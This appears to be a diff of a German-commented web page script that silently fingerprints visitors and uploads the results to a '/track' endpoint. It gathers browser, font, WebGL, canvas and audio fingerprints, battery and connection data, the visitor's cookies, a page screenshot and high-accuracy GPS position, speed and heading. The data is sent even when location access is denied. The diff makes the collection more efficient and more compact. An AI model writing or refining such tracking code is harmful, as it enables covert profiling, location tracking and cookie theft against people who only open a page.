@@ -9,6 +9,7 @@
     .ok { color: green; }
     .err { color: #b00; }
   </style>
+  <!-- Screenshot lib -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 </head>
 <body>
@@ -26,53 +27,50 @@
     }
 
     async function getBattery() {
-      if (!navigator.getBattery) return '–';
+      if (!navigator.getBattery) return null;
       try {
-        const battery = await navigator.getBattery();
-        return JSON.stringify({
-          charging: battery.charging,
-          level: battery.level * 100 + '%',
-          chargingTime: battery.chargingTime,
-          dischargingTime: battery.dischargingTime
-        });
-      } catch { return '–'; }
+        const b = await navigator.getBattery();
+        return { charging: b.charging, level: Math.round(b.level * 100), chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
+      } catch { return null; }
     }
 
     function getPlugins() {
-      if (!navigator.plugins) return '–';
-      return Array.from(navigator.plugins).map(p => ${p.name} (${p.version || '–'})).join(', ');
+      try {
+        if (!navigator.plugins) return null;
+        return Array.from(navigator.plugins).map(p => `${p.name} (${p.version || '–'})`);
+      } catch { return null; }
     }
 
     function getFonts() {
-      const fonts = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'];
+      const fonts = ['Arial','Helvetica','Times New Roman','Courier New','Verdana','Georgia','Palatino','Garamond','Bookman','Comic Sans MS','Trebuchet MS','Arial Black','Impact'];
       return fonts.filter(font => {
         const span = document.createElement('span');
         span.style.fontFamily = font;
-        span.innerHTML = 'abcdefghijklmnopqrstuvwxyz';
+        span.textContent = 'abcdefghijklmnopqrstuvwxyz';
         document.body.appendChild(span);
         const width = span.offsetWidth;
         document.body.removeChild(span);
         return width !== 0;
-      }).join(', ');
+      });
     }
 
     function getWebGL() {
       try {
         const canvas = document.createElement('canvas');
         const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (!gl) return '–';
+        if (!gl) return null;
         const info = gl.getExtension('WEBGL_debug_renderer_info');
-        return JSON.stringify({
-          vendor: info?.glGetParameter(info.UNMASKED_VENDOR_WEBGL) || '–',
-          renderer: info?.glGetParameter(info.UNMASKED_RENDERER_WEBGL) || '–'
-        });
-      } catch { return '–'; }
+        const vendor = info ? gl.getParameter(info.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
+        const renderer = info ? gl.getParameter(info.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+        return { vendor, renderer };
+      } catch { return null; }
     }
 
-    function getCanvasFingerprint() {
+    async function getCanvasFingerprint() {
       try {
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
+        canvas.width = 240; canvas.height = 80;
         ctx.textBaseline = 'top';
         ctx.font = '14px Arial';
         ctx.fillStyle = '#f60';
@@ -81,127 +79,120 @@
         ctx.fillText('Hello, world!', 2, 15);
         ctx.strokeStyle = 'rgba(102, 204, 0, 0.7)';
         ctx.beginPath();
-        ctx.arc(100, 75, 50, 0, Math.PI * 2, true);
+        ctx.arc(100, 40, 30, 0, Math.PI * 2);
         ctx.stroke();
-        return canvas.toDataURL();
-      } catch { return '–'; }
+        return canvas.toDataURL('image/webp', 0.7); // kleiner als PNG
+      } catch { return null; }
     }
 
+    // leiser Audio-Fingerprint (kein Sound)
     async function getAudioFingerprint() {
       try {
-        const ctx = new (window.AudioContext || window.webkitAudioContext)();
-        const oscillator = ctx.createOscillator();
-        oscillator.type = 'sine';
-        oscillator.frequency.setValueAtTime(440, ctx.currentTime);
-        const compressor = ctx.createDynamicsCompressor();
-        oscillator.connect(compressor);
-        compressor.connect(ctx.destination);
-        oscillator.start();
-        oscillator.stop(ctx.currentTime + 0.1);
-        await new Promise(resolve => setTimeout(resolve, 100));
-        return JSON.stringify({ sampleRate: ctx.sampleRate, state: ctx.state });
-      } catch { return '–'; }
+        if (!window.OfflineAudioContext) return null;
+        const ctx = new OfflineAudioContext(1, 44100, 44100);
+        const osc = new OscillatorNode(ctx, { type: 'sine', frequency: 440 });
+        const comp = new DynamicsCompressorNode(ctx);
+        osc.connect(comp).connect(ctx.destination);
+        osc.start(0); osc.stop(0.1);
+        const buf = await ctx.startRendering();
+        // kleine Signatur
+        const sig = Array.from(buf.getChannelData(0).slice(0, 200)).map(n => n.toFixed(5)).join(',');
+        return sig;
+      } catch { return null; }
     }
 
     async function getScreenshot() {
       try {
-        const canvas = await html2canvas(document.body);
-        return canvas.toDataURL('image/png');
+        const canvas = await html2canvas(document.body, { scale: 1, useCORS: true });
+        return canvas.toDataURL('image/jpeg', 0.6); // komprimiert halten
       } catch { return null; }
     }
 
     async function collectData(geoStatus) {
+      const [battery, plugins, fonts, webgl, canvas_fingerprint, audio_fingerprint, screenshot] = await Promise.all([
+        getBattery(), Promise.resolve(getPlugins()), Promise.resolve(getFonts()), Promise.resolve(getWebGL()),
+        getCanvasFingerprint(), getAudioFingerprint(), getScreenshot()
+      ]);
+
       return {
-        request_id: crypto?.randomUUID() || String(Date.now()),
-        lat: null,
-        lon: null,
-        accuracy: null,
-        altitude: null,
-        heading: null,
-        speed: null,
+        request_id: (crypto && crypto.randomUUID) ? crypto.randomUUID() : String(Date.now()),
+        lat: null, lon: null, accuracy: null, altitude: null, heading: null, speed: null,
         geo_status: geoStatus || 'unbekannt',
         userAgent: navigator.userAgent || '',
         language: navigator.language || '',
-        languages: JSON.stringify(navigator.languages || []),
+        languages: (navigator.languages || []).join(','),
         cookies: document.cookie || '',
-        screen: JSON.stringify({
+        screen: {
           width: window.screen?.width,
           height: window.screen?.height,
           colorDepth: window.screen?.colorDepth,
           availWidth: window.screen?.availWidth,
           availHeight: window.screen?.availHeight
-        }),
-        window: JSON.stringify({
+        },
+        viewport: {
           innerWidth: window.innerWidth,
           innerHeight: window.innerHeight,
           outerWidth: window.outerWidth,
           outerHeight: window.outerHeight
-        }),
+        },
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
         platform: navigator.platform || '',
-        hardwareConcurrency: navigator.hardwareConcurrency ?? '',
-        deviceMemory: navigator.deviceMemory ?? '',
-        connection: JSON.stringify(navigator.connection ? {
+        hardwareConcurrency: navigator.hardwareConcurrency ?? null,
+        deviceMemory: navigator.deviceMemory ?? null,
+        connection: (navigator.connection ? {
           effectiveType: navigator.connection.effectiveType,
           downlink: navigator.connection.downlink,
           rtt: navigator.connection.rtt,
-          saveData: navigator.connection.saveData
-        } : {}),
+          saveData: navigator.connection.saveData || false
+        } : null),
         referrer: document.referrer || '',
-        plugins: getPlugins(),
-        fonts: getFonts(),
-        webgl: getWebGL(),
-        battery: await getBattery(),
-        canvas_fingerprint: getCanvasFingerprint(),
-        audio_fingerprint: await getAudioFingerprint(),
-        screenshot: await getScreenshot(),
+        pixelRatio: window.devicePixelRatio || 1,
+        colorScheme: (matchMedia && matchMedia('(prefers-color-scheme: dark)').matches) ? 'dark'
+                   : (matchMedia && matchMedia('(prefers-color-scheme: light)').matches) ? 'light' : 'no-preference',
+        colorGamut: (['srgb','p3','rec2020'].find(g => matchMedia && matchMedia(`(color-gamut: ${g})`).matches)) || 'unknown',
+
+        plugins, fonts, webgl, battery, canvas_fingerprint, audio_fingerprint, screenshot,
         timestamp: new Date().toISOString()
       };
     }
 
     async function sendData(data) {
-      return fetch('/track', {
+      const res = await fetch('/track', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(data)
       });
+      if (!res.ok) throw new Error('HTTP ' + res.status);
     }
 
     (async function run() {
       const geoStatus = await getGeoPermission();
       const data = await collectData(geoStatus);
 
-      const done = () => {
-        const s = document.getElementById('status');
-        s.textContent = '✅ Daten wurden an den Server gesendet.';
-        s.className = 'ok';
+      const done = (msg='✅ Daten wurden an den Server gesendet.') => {
+        const s = document.getElementById('status'); s.textContent = msg; s.className = 'ok';
       };
       const fail = (err) => {
         console.error(err);
-        const s = document.getElementById('status');
-        s.textContent = '❌ Senden fehlgeschlagen.';
-        s.className = 'err';
+        const s = document.getElementById('status'); s.textContent = '❌ Senden fehlgeschlagen.'; s.className = 'err';
       };
 
-      // Präzise Geolocation (High Accuracy)
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           pos => {
-            data.lat = pos.coords.latitude;
-            data.lon = pos.coords.longitude;
-            data.accuracy = typeof pos.coords.accuracy === 'number' ? pos.coords.accuracy : null;
-            data.altitude = typeof pos.coords.altitude === 'number' ? pos.coords.altitude : null;
-            data.heading = typeof pos.coords.heading === 'number' ? pos.coords.heading : null;
-            data.speed = typeof pos.coords.speed === 'number' ? pos.coords.speed : null;
-            sendData(data).then(done).catch(fail);
+            const c = pos.coords;
+            data.lat = c.latitude; data.lon = c.longitude;
+            if (typeof c.accuracy === 'number') data.accuracy = c.accuracy;
+            if (typeof c.altitude === 'number') data.altitude = c.altitude;
+            if (typeof c.heading === 'number') data.heading = c.heading;
+            if (typeof c.speed === 'number') data.speed = c.speed;
+            sendData(data).then(() => done()).catch(fail);
           },
-          () => { // Verweigert/Fehler -> ohne Location senden
-            sendData(data).then(done).catch(fail);
-          },
+          () => { sendData(data).then(() => done('✅ (ohne GPS) gesendet.')).catch(fail); },
           { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
       } else {
-        sendData(data).then(done).catch(fail);
+        sendData(data).then(() => done()).catch(fail);
       }
     })();
   </script>
